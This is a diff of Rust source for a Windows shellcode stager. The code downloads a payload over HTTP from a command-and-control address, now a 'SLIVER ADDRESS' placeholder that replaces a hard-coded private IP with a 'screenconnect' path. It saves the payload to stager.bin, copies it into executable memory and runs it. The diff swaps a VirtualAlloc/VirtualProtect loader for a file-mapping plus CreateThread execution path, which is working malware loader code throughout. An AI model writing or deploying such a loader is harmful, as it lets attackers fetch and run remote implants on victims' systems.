@@ -1,12 +1,11 @@
-use windows::Win32::System::Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS};
-use std::io;
-use std::io::Read;
-use std::fs::File;
 use reqwest::blocking;
-use std::fs::OpenOptions;
+use std::fs::{File, OpenOptions};
+use std::{io, io::Read, ptr};
+use windows::Win32::Foundation::INVALID_HANDLE_VALUE;
+use windows::Win32::System::Memory::*;
+use windows_sys::Win32::System::Threading::{CreateThread, INFINITE, WaitForSingleObject};
 
-fn main()
-{
+fn main() {
     let mut _file = match download() // Call the download function and match on the result
     {
         Ok(file) => file, // If the download was successful, return the file handle
@@ -25,10 +24,12 @@ fn main()
         }
     };
 
-    println!("Shellcode downloaded and converted successfully. Length: {} bytes", _shellcode.len());
+    println!(
+        "Shellcode downloaded and converted successfully. Length: {} bytes",
+        _shellcode.len()
+    );
 
-    load(_shellcode); // Call the load function to execute the shellcode
-
+    handle(_shellcode.len(), _shellcode);
 }
 
 // Download the remote shellcode and save it to disk.
@@ -36,25 +37,25 @@ fn main()
 fn download() -> Result<File, Box<dyn std::error::Error>> // Return a nothing on success or any type of error on failure. Box puts the error on the heap for a predictable size. dyn is for dynamic as the error is unknown at complie time.
 {
     // Use reqwest to download to get the shell code
-    let mut _url = blocking::get("http://192.168.174.128:4443/screenconnect/id?=64545")?;
+    let mut _url = blocking::get("SLIVER ADDRESS")?;
     // Create a file to save the shellcode to
     let mut _path = File::create("stager.bin")?;
 
-
     io::copy(&mut _url, &mut _path); // Copy the contents of the url to the file. The ? operator will return an error if it occurs, othewise it will continue.
-    
+
     Ok(_path) // Return the file handle on success
 }
 
 // Turn the downloaded shellcode into a byte array that can be executed in memory.
-fn bin_to_byte(_file: File) -> Result<Vec<u8>, Box<dyn std::error::Error>> { // returns a vector of 8 bit unsigned integers
-   
-   // Due to permissions issues, the file needs to be opened and have read and write set to true. Create shouldn't be needed but I set it just in case
+fn bin_to_byte(_file: File) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+    // returns a vector of 8 bit unsigned integers
+
+    // Due to permissions issues, the file needs to be opened and have read and write set to true. Create shouldn't be needed but I set it just in case
     let _file = OpenOptions::new()
         .read(true)
         .write(true)
         .open("stager.bin")?; // Open the file for reading. The ? operator will return an error if it occurs, otherwise it will continue.   
-   
+
     // create a buffer to hold the contents. This is a vector of 8 bit unsigned integers, which is the same as a byte array. The buffer will be filled with the contents of the file.
     let mut buffer = Vec::new();
 
@@ -65,30 +66,75 @@ fn bin_to_byte(_file: File) -> Result<Vec<u8>, Box<dyn std::error::Error>> { // 
     Ok(buffer)
 }
 
-// load the shellcode into memory and execute it.
-fn load(shellcode: Vec<u8>)
-{
-    // Open an unsafe block to call the Windows API functions. This is necessary because the functions are not safe to call and can cause undefined behavior if used incorrectly.
+unsafe extern "system" fn start(address: *mut core::ffi::c_void) -> u32 {
     unsafe {
-        // std::ptr::null_mut() is used to get a null pointer, effectively telling virtual alloc to choose the address. The some is a wrapper from the windows crate to convert the raw pointer into an option type. This is done to prevent null pointer dereferences.
-        // Allocate
-        let mut _ptr = VirtualAlloc(Some(std::ptr::null_mut()), shellcode.len(), MEM_COMMIT, PAGE_READWRITE);
-        if _ptr.is_null() {
-            eprintln!("VirtualAlloc failed");
-            std::process::exit(1);
-        }
-        
-        // Copy the shellcode into the allocated memory. The copy_nonoverlapping function is used to copy the bytes from the shellcode vector to the allocated memory. The as_ptr() method is used to get a pointer to the first byte of the shellcode vector, and the ptr variable is cast to a mutable pointer to u8. The length of the shellcode is also passed to ensure that the correct number of bytes are copied.
-        // Copy
-        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), _ptr as *mut u8, shellcode.len());
-
-        let mut old_protect = PAGE_PROTECTION_FLAGS(0); // Create a variable to hold the old protection flags. This is necessary because VirtualProtect will change the protection flags of the allocated memory, and we need to restore them after executing the shellcode.
-
-        VirtualProtect(_ptr.cast::<std::ffi::c_void>(), shellcode.len(), PAGE_EXECUTE_READ, &mut old_protect); // Change the memory protection to execute read. This is necessary to execute the shellcode. The same address is passed to change the protection of the allocated memory. The length and protection flags are also passed.
-
-        // Create a function pointer to the allocated memory and call it. The transmute function is used to convert the raw pointer to a function pointer. The extern "C" fn() type is used to specify that the function has no parameters and returns nothing. The function is then called, which will execute the shellcode.
-        // Execute
-        let func: extern "C" fn() = std::mem::transmute(_ptr);
+        println!("Address passed through successfully {:?}", address);
+        let func: extern "C" fn() = std::mem::transmute(address);
+        println!("Transmutation is successful.");
         func();
+        0
+    }
+}
+
+fn handle(byte_size: usize, _shellcode: Vec<u8>) {
+    let desired_access = SECTION_MAP_READ.0 | SECTION_MAP_WRITE.0 | SECTION_MAP_EXECUTE.0;
+    let allocation_attributes = SEC_COMMIT.0;
+    let page_protection = PAGE_EXECUTE_READWRITE;
+
+    let file_mapping = unsafe {
+        CreateFileMapping2(
+            INVALID_HANDLE_VALUE,
+            None,
+            desired_access,
+            page_protection,
+            allocation_attributes,
+            byte_size as u64,
+            None,
+            None,
+        )
+        .unwrap()
+    };
+
+    let map_view = unsafe {
+        MapViewOfFile(
+            file_mapping,
+            FILE_MAP_READ | FILE_MAP_WRITE | FILE_MAP_EXECUTE,
+            0,
+            0,
+            0,
+        )
+    }
+    .Value;
+
+    if map_view.is_null() {
+        println!("Map View is null.");
+        return;
+    }
+
+    unsafe { std::ptr::copy_nonoverlapping(_shellcode.as_ptr(), map_view.cast(), byte_size) };
+    
+    // Virtual Protect 
+    let mut old = PAGE_PROTECTION_FLAGS(0);
+    unsafe { VirtualProtect(map_view.cast_const(), byte_size, PAGE_EXECUTE_READ, &mut old) };
+
+    let x = unsafe {
+        CreateThread(
+            ptr::null(),
+            0,
+            Some(start),
+            map_view.cast::<core::ffi::c_void>(),
+            0,
+            ptr::null_mut(),
+        )
+    };
+
+    unsafe { WaitForSingleObject(x, INFINITE) };
+    if x.is_null()
+    {
+        println!("The creation of the thread failed.");
+    }
+    else 
+    {
+        println!("The handle for the thread is {:?}", x);
     }
 }
